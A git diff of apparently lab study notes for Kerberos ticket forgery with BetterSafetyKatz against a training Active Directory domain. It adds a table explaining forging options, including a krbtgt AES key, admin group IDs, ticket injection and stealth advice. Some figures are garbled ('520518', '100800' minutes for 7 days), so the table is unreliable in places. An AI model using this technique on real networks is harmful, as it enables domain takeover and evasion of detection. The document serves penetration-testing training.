@@ -79,12 +79,12 @@ $ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain
 |  /sid:S-1-5-21-719815819-3726368948-3917688648|   SID of the domain   |
 | /target:dcorp-dc.dollarcorp.moneycorp.local | Target server FQDN |
 |    /service:cifs  |  The SPN name of service for which TGS is to be created    |
-
-
-
-
-
-
+|   /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848   |   AES256 keys of the krbtgt account. Using AES keys makes the attack more silent.  |
+|    /id:500 /groups:512  |   Optional User RID (default 500) and Group default 513 512 520518 519)   |
+| /ptt   |    Injects the ticket in current PowerShell process - no need to save the ticket on disk  |
+|    /startoffset:0  |  Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.    |
+|    /endin:600  |    Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes  |
+|   /renewmax:10080   |   Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800   |
 
 
 
